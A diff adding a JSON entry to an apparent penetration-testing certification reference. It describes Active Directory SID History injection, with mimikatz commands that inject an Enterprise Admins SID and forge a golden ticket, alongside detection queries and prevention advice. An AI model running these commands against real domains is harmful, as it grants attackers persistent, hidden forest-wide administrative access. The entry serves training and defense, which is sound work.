@@ -1,0 +1,101 @@
+{
+  "id": "ad-sid-history-persistence",
+  "name": "SID History Injection - Cross-Domain Persistence",
+  "command": "mimikatz# sid::add /sam:TargetUser /new:S-1-5-21-<parent_domain_sid>-519",
+  "description": "SID History injection adds the SID of a privileged group (e.g., Enterprise Admins S-...-519) from a parent domain into a user account in a child domain. The injected SID is included in the users Kerberos ticket, granting them access to resources in the parent domain without being a member of those groups. Survives password resets.",
+  "platform": "windows",
+  "type": "command",
+  "opsec": "quiet",
+  "category": "Active Directory",
+  "subcategory": "Domain Persistence",
+  "certifications": [
+    "CRTP",
+    "CPTS"
+  ],
+  "primary_cert": "CRTP",
+  "source": "CRTP cross-domain module; mimikatz sid::add",
+  "tags": [
+    "sid-history",
+    "persistence",
+    "cross-domain",
+    "enterprise-admins",
+    "mimikatz",
+    "trust-abuse"
+  ],
+  "mitre": [
+    "T1134.005"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== THE IDEA ===\nSID History was designed for domain migrations - when a user moves\nfrom Domain A to Domain B, their old SID is preserved in SIDHistory\nso they keep access to old resources. Attackers abuse this to inject\nprivileged SIDs from a parent domain into child domain accounts.\n\n=== INJECT WITH MIMIKATZ ===\n  # Requires DA on the child domain + patching NTDS\n  mimikatz# privilege::debug\n  mimikatz# sid::patch\n  mimikatz# sid::add /sam:TargetUser /new:S-1-5-21-<parent_EA_sid>-519\n  # 519 = Enterprise Admins\n\n=== INJECT VIA GOLDEN TICKET ===\n  # Alternative: include SID in a forged ticket\n  mimikatz# kerberos::golden /user:TargetUser /domain:<child_domain> /sid:<child_sid> /krbtgt:<child_krbtgt_hash> /sids:S-1-5-21-<parent_EA_sid>-519 /ptt\n\n=== VERIFY ===\n  # Check SID History on the account:\n  Get-ADUser TargetUser -Properties SIDHistory | Select SIDHistory\n  # The user now has EA privileges when accessing parent domain resources\n\n=== WHY ITS POWERFUL ===\n- Survives password resets\n- Not visible in standard group membership queries\n- Works across domain boundaries within the forest\n- The SID is embedded in the Kerberos PAC",
+  "examples": [
+    {
+      "label": "Inject Enterprise Admin SID into user",
+      "command": "mimikatz# sid::add /sam:TargetUser /new:S-1-5-21-<parent_EA_sid>-519"
+    },
+    {
+      "label": "Include SID in Golden Ticket",
+      "command": "mimikatz# kerberos::golden /user:TargetUser /domain:<child_domain> /sid:<child_sid> /krbtgt:<child_krbtgt_hash> /sids:S-1-5-21-<parent_EA_sid>-519 /ptt"
+    },
+    {
+      "label": "Check SID History on account",
+      "command": "Get-ADUser TargetUser -Properties SIDHistory | Select SIDHistory"
+    }
+  ],
+  "references": [
+    {
+      "title": "MITRE T1134.005 - SID-History Injection",
+      "url": "https://attack.mitre.org/techniques/T1134/005/"
+    },
+    {
+      "title": "ADSecurity - SID History Persistence",
+      "url": "https://adsecurity.org/?p=1772"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-dcshadow",
+      "note": "DCShadow can inject SID History stealthily via replication.",
+      "rel": "alternative"
+    },
+    {
+      "id": "crtp-golden-ticket",
+      "note": "Golden Tickets can include extra SIDs for cross-domain access.",
+      "rel": "alternative"
+    }
+  ],
+  "defense": {
+    "why_it_works": "The SIDHistory attribute is included in the Kerberos PAC without further validation by the parent domain. A child domain DA can inject any SID, and the parent domain trusts it.",
+    "prerequisites": "Domain Admin on the child domain; knowledge of the parent domain SID.",
+    "impact": "Persistent cross-domain privilege escalation; effectively Enterprise Admin without group membership.",
+    "detection": "[MITRE T1134.005] Event 4765/4766 (SID History added); accounts with SIDHistory containing privileged SIDs.",
+    "artifacts": "Event 4765 (SID History added to account); SIDHistory attribute on user objects; unusual cross-domain access patterns.",
+    "splunk_spl": "index=windows EventCode IN (4765, 4766)\n| table _time, TargetUserName, SidHistory, SubjectUserName",
+    "elastic_kql": "event.code:(\"4765\" OR \"4766\")",
+    "sentinel_kql": "SecurityEvent\n| where EventID in (4765, 4766)\n| project TimeGenerated, TargetUserName, SubjectUserName, SidHistory",
+    "sigma_rules": "win_security_sid_history_injection",
+    "prevention": "Enable SID Filtering on trusts; monitor SIDHistory attribute changes; audit Event 4765/4766; restrict Domain Admin usage.",
+    "sources": [
+      "CRTP cross-domain module",
+      "https://attack.mitre.org/techniques/T1134/005/"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "SID History injection on user account",
+        "logic": "SecurityEvent\n| where EventID in (4765, 4766)\n| project TimeGenerated, TargetUserName, SubjectUserName, SidHistory\n| extend InjectedSID = tostring(SidHistory)",
+        "data_source": "windows-security",
+        "log_ids": [
+          "4765",
+          "4766"
+        ],
+        "attack": [
+          "T1134.005"
+        ],
+        "fidelity": "signature",
+        "confidence": "high",
+        "false_positives": "Legitimate domain migrations using ADMT",
+        "tuning": "Any SID History modification outside of planned migrations should trigger an alert"
+      }
+    ]
+  }
+}
